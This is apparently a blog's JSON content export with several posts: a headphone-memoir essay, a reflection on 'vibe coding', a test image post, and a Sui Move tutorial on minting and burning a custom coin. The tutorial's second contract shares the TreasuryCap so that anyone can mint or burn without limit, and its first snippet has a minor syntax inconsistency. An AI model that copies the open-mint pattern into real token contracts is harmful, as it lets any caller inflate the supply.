建立了完整的区块链安全知识体系\n\n这些技能和经验对于区块链安全研究、智能合约审计、以及Web3安全防护都具有重要的实践价值。随着区块链技术的不断发展，这类综合性的安全挑战将变得越来越重要，需要我们持续学习和实践。\n"},{"title":"How To Define a Referenced Sound?","url":"/2025/04/28/How To Define a Referenced Sound/","content":"## For The Beginning\n\nNow i am lying on my bed listening to Blowin' In The Wind by Bob Dylan with my Sony WF-XM4 which reminds me of my old memories. This one is a wireless headset with low bandwidth and thick low frequency volume. I used to like high frequency monitoring about four years ago. Yes I quit. I stopped chasing high fidelity and choose convenient instead. I’m not quite sure whether it’s financial austerity or just academics. I wanted to note something Deja Vu on my head.\n\n## 1. MoonDrop\n\nIn the far long past years I listened to different types of IEM, what makes me feel the must touching is MoonDrop Kxxs, I was depressed in my age of 18. I lost my patience and curiosity in the whole world in a highly pressured environment: My High School. So I listen to a theme ACG from When the Cicadas Cry, It gave me a peaceful Zen for a short summer. That's also my age I got addicted to Nicotine.\n\nBy chance, I stumbled upon Kxxs review videos on Bilibili, sparking my dive into the world of headphones. The MoonDrop Kxxs, with its sleek silver design and single dynamic driver, came paired with a crystal-clear, silver-plated copper braided cable that silenced the annoying stethoscope effect as I lay in bed, lost in music. That wire stopped me from hearing stethoscope effect noises when I crying in my bed. A standard Harman Curve based training sound effect makes me immersed in the ocean of tunes.\n\nI started obsessed with ACG and slowly turned to Electronic and Rock genres. I used them to release the pain and suffer inside me. After half a year, I was cured.\n\nAlthough it has done well in Mid-frequency vocal part and low-frequency rhythm. But it seems to be more like a luxury symbol in that period of time. Kxxs is no more than a Entry-level headphone. The diaphragm isn't that professional and \"Referenced\". Now , Kxxs is officially announced discontinued. When i look up to the materials, Kato the plus version and KADENZ the final version has replaced it. The curtain of Kxxs has fell. However, it gave me a brief path on the way finding the \"Reference Sound\", the Harman Curve.\n\n## 2. Harman Curve\n\nImagine one simple frequency response diagram can quantification the beautiful of music, that is the Harman Curve. Harman researchers find that nearly straight frequency response won't give a better deduction to the audience. Just like chocolate bars, without corners and lines makes them rigid and tasteless.\n\nThe Harman Curve is dedicating a publicly acceptable frequency response, gain in the low frequency for better liveliness, and improve the high frequency to enhance larger sound field and fidelity, the sound will be not as dry or boring as the record studio do. But now there came up to an problem: “How to convince me that a non-original sound is referenced?”. I can’t. It depends on individually ear preference. Some would think a formulated studio sound is referenced, but some would think a sound that company them through the darkness and asphyxia times. But all i can say is Harman Curve designed a paradigm, less than it can’t be good goods, equals to it would be boring, beyond it brining a different whole new universe.\n\n## 3. Dunu Est 112\n\nIt was the first time knowing Multi-sound unit design when i browsed headphones forums in my age of 19. I sold my Kxxs with deep cherish and bought Dunu Est 112 on Chinese Ebay. Larger power and resolution requirements didn't stopped me, i also bought a Low-spec headphone amp which cost me around 40 dollars.\n\nDunu Est 112 has four different units : 1 Dynamic Driver, 1 Balanced Armature, 2 Electrostatic Drivers. Without doubt, this headphone brings significant high frequency resolution and shortage in low frequency performance. \n\nI really love the electrostatic unit in these earphones. I especially enjoy using them to listen to electronic music, like Coldplay’s *Hymn For The Weekend* or Mike Perry/SHY Martin’s *The Ocean (Radio Edit)*. The electrostatic unit handles the highs with a sweet and smooth quality, rarely producing any sibilance. Complemented by the dynamic driver, the rhythm and bass impact of the songs are quite impressive, as the electrostatic sound overshadows them......However, when switching to other genres, the bass lacks depth, and the soundstage feels scattered and incoherent.\n"},{"title":"Artificial Intelligence Genesis 1-2","url":"/2025/04/16/AI/","content":"## The Creation of the Binary and Humanity\n\n***If*** you're a programmer and haven't heard of vibe coding, you're already behind. The term originated from a semi-self-deprecating tweet and has now become standard usage, although no one can precisely define it. Those familiar with AI-assisted programming generally know what it means: accepting AI suggestions without scrutinizing differences; copying and pasting error messages until the problem is solved; bypassing or randomly changing code that's beyond comprehension until the bug disappears.\n\n***Vibe***  coding feels like a divine assistance on one hand, but on the other, it leads to constant refactoring, going in circles, solving old problems, and creating new ones. Faced with a plethora of tools, it's hard to know which to seriously consider, and new best practices only generate more hidden bugs at a faster pace.\n\n***The*** technical difficulties may lie in the large language model's insufficient context window and the lack of robust long-term memory mechanisms. But in reality, vibe coding shatters the programmer's self-perception, trapping them in a maze built on shifting sands, exhausted and forgetting what efficiency means.\n\n***Vibe*** coding is somewhat like AI art from a year or two ago, looks good at first glance, but the details are wrong when zoomed in. Programming is supposed to be black and white, but reality begins to distort. The correctness of vibe coding cannot be precisely observed. Faced with the massive amount of code generated by AI, programmers quickly give up scrutiny and control. Attempting to guide AI with standards is like a rein on a wild horse, uncertain whether the rules are complete or whether they will be followed.\n\n***Gradually\\,*** programmers stop caring whether the code is correct, as it can always be changed later. In the future, most code will be written by AI, with six-fingered hands appearing and disappearing endlessly. Accepting that temporary work is everything, and change is the only constant. When international news and satirical news become indistinguishable, when all those claiming to pursue truth ultimately seek escape, everything you create will not escape the same fate.\n\n***Individuals*** hiding in a bubble assume everything is fine, but this is often the origin of tragedy. They see only a low-dimensional projection of a complex world, a crude narrative, a mirage. Truth falls into the dark and deep dimensional cracks. What collapses is not the world, but one's own naive imagination. The external is not a projection of reality, but its essence. At first, you think the world is a perfect canvas, then you find more and more cracks, until you realize that the cracks are where you truly live. **It's not just vibe coding, it's vibe living.**\n","tags":["AI"],"categories":["Tec"]},{"title":"Test","url":"/2025/04/16/Test/","content":"## This is a simple test for media assets uploading\n\n![](https://raw.githubusercontent.com/DudeGuuud/dudeguuud.github.io/main/images/25/4/kali-red-sticker_95812a9edf3279ab16a5402fbbdbeb71.jpg)\n"},{"title":"0x2 Mint & Burn","url":"/2025/04/16/MoveTASK2/","content":"# 0x2 Mint & Burn\n\n## Publish Contract\n\n```rust\nmodule task2::my_coin;\n    use sui::coin::{Self, Coin, TreasuryCap};\n    use std::debug;\n    use std::ascii::string;\n//\n    public struct MY_COIN has drop {}\n\n    fun init(witness: MY_COIN, ctx: &mut TxContext) {\n        let (treasury, metadata) = coin::create_currency(\n            witness,\n            6,\n            b\"DUDE\",\n            b\"DUDE_COIN\",\n            b\"This is DudeGuuud Coin.\",\n            option::none(),\n            ctx);\n        debug::print(&string(b\"init MY_COIN\"));\n        transfer::public_freeze_object(metadata);\n        transfer::public_transfer(treasury, ctx.sender())\n    }\n\n    public entry fun mint(\n        treasury_cap: &mut TreasuryCap<MY_COIN>,\n        amount: u64,\n        recipient: address,\n        ctx: &mut TxContext,\n    ) {\n        debug::print(&string(b\"my_coin mint\"));\n        let coin = coin::mint(treasury_cap, amount, ctx);\n        transfer::public_transfer(coin, recipient)\n    }\n\n    public entry fun burn(\n        treasury_cap: &mut TreasuryCap<MY_COIN>,\n        coin: Coin<MY_COIN>\n    ) {\n        debug::print(&string(b\"burn\"));\n        coin::burn(treasury_cap, coin);\n    }\n}\n```\n\n其主要内容是mint自定义代币和销毁，因为treasury_cap属于私有，只有所属钱包（第一次publish见证者账户）\n\n* 在当前代码中，**TreasuryCap** 在 **init** 函数中通过 **transfer::public\\_transfer** 转移到 **ctx.sender()**（发布者的地址）。\n* 这意味着只有发布者的地址（见证者账户）持有 **TreasuryCap**，可以调用 **mint** 和 **burn**。\n* 其他账户无法直接操作，除非发布者显式转移 **TreasuryCap**（例如通过 **transfer::public\\_transfer**）\n\n同时如果需要共享TreasuryCap的权限\n\n```rust\nmodule task2::my_coin {\n    use sui::coin::{Self, Coin, TreasuryCap};\n    use sui::transfer;\n    use sui::tx_context::{Self, TxContext};\n    use sui::object::{Self, UID};\n    use sui::event;\n    use std::ascii::string;\n    use std::option;\n\n    // 代币结构体\n    public struct MY_COIN has drop {}\n\n    // 共享对象，用于存储 TreasuryCap\n    public struct SharedTreasury has key {\n        id: UID,\n        treasury: TreasuryCap<MY_COIN>,\n    }\n\n    // 铸造事件\n    public struct MintEvent has copy, drop {\n        amount: u64,\n        recipient: address,\n    }\n\n    // 销毁事件\n    public struct BurnEvent has copy, drop {\n        amount: u64,\n    }\n\n    // 初始化函数：创建代币并将 TreasuryCap 放入共享对象\n    fun init(witness: MY_COIN, ctx: &mut TxContext) {\n        let (treasury, metadata) = coin::create_currency(\n            witness,\n            6,\n            b\"DUDE\",\n            b\"DUDE_COIN\",\n            b\"This is DudeGuuud Coin.\",\n            option::none(),\n            ctx\n        );\n        // 冻结元数据\n        transfer::public_freeze_object(metadata);\n        // 创建共享对象并存储 TreasuryCap\n        let shared_treasury = SharedTreasury {\n            id: object::new(ctx),\n            treasury,\n        };\n        transfer::share_object(shared_treasury);\n    }\n\n    // 公共铸造函数：任何人可调用\n    public entry fun mint(\n        shared: &mut SharedTreasury,\n        amount: u64,\n        recipient: address,\n        ctx: &mut TxContext,\n    ) {\n        let coin = coin::mint(&mut shared.treasury, amount, ctx);\n        event::emit(MintEvent { amount, recipient });\n        transfer::public_transfer(coin, recipient);\n    }\n\n    // 公共销毁函数：任何人可调用\n    public entry fun burn(\n        shared: &mut SharedTreasury,\n        coin: Coin<MY_COIN>\n    ) {\n        let amount = coin::value(&coin);\n        coin::burn(&mut shared.treasury, coin);\n        event::emit(BurnEvent { amount });\n    }\n}\n```\n\n如果将 **TreasuryCap** 存储在一个共享对象（**SharedTreasury**）中，允许任何人调用。\n提供公共入口函数（**public entry fun**），通过共享对象间接访问 **TreasuryCap**，因为共享了所有权，**Call** 就可以了，要求对所有权表示敬畏。\n","tags":["Web3"],"categories":["Web3"]}]